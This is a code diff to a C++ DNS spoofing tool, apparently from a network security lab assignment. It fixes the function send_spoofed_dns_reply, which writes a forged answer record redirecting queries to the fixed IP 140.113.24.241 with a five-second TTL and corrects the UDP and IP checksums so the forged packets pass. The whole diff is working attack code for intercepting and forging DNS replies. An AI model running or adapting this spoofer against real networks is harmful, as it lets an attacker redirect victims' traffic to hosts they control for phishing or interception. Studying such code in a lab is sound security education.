@@ -59,7 +59,7 @@ struct answer_section
     uint16_t class_;
     uint32_t ttl;
     uint16_t rdlength;
-    // uint32_t rdata;
+    uint32_t rdata;
 };
 
 string gateway_ip;
@@ -398,37 +398,31 @@ void send_spoofed_dns_reply(char *packet)
     // move the pointer to the answer section
     // char *dns_answer = (char *)(packet + ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
     // derive the question section
-    int queries_len = 5;
+    int queries_len = 0;
     while (*dns_query != 0)
     {
-        queries_len += *dns_query + 1;
-        dns_query += *dns_query + 1;
+        queries_len = *dns_query;
+        dns_query += queries_len + 1;
     }
-    cout << "Queries length: " << queries_len << endl;
-    cout << "Position of dns_query: " << dns_query - packet << endl;
-    // move the pointer to the answer section
-    dns_query += 1;
-    cout << "Position of dns_query: " << dns_query - packet << endl; 
+    dns_query += 4;
+    // cout position of dns_query
+    // cout << "Position of dns_query: " << dns_query - packet << endl;
+    
+
+
     // derive the answer section
-    char *dns_answer = dns_query;
-    struct answer_section *answer = (struct answer_section *)dns_answer;
+    struct answer_section *answer = (struct answer_section *)dns_query;
     answer->name = htons(0xc00c);
     answer->type = htons(1);
     answer->class_ = htons(1);
     answer->ttl = htonl(5);
     answer->rdlength = htons(4);
-    dns_answer += sizeof(answer_section);
-    // cout position of dns_answer
-    // cout << "Position of dns_answer: " << dns_answer - packet << endl;
-    // attach the IP 140.113.24.241 address to the answer section
-    *dns_answer = 140;
-    *(dns_answer + 1) = 113;
-    *(dns_answer + 2) = 24;
-    *(dns_answer + 3) = 241;
-    dns_answer += 4;
+    // set rdata 140.113.24.241
+    answer->rdata = inet_addr("140.113.24.241");
+    
 
     // calculate total length  
-    int total_len = dns_answer - packet;
+    int total_len = (dns_query - packet) + sizeof(answer_section);
     // cout << "Total length: " << total_len << endl;
     udp_header->len = htons(total_len - ip_header->ihl * 4);
     ip_header->tot_len = htons(total_len);
@@ -464,7 +458,7 @@ void send_spoofed_dns_reply(char *packet)
     }
 
     // Store the one's complement of sum in the checksum field of the UDP header
-    udp_header->check = ~sum;
+    udp_header->check = ~htons(sum);
 
     // calculate the ip checksum
     ip_header->check = 0;
@@ -478,7 +472,7 @@ void send_spoofed_dns_reply(char *packet)
     {
         sum = (sum & 0xFFFF) + (sum >> 16);
     }
-    ip_header->check = ~sum;
+    ip_header->check = ~htons(sum);
 
 
     // send the spoofed DNS reply
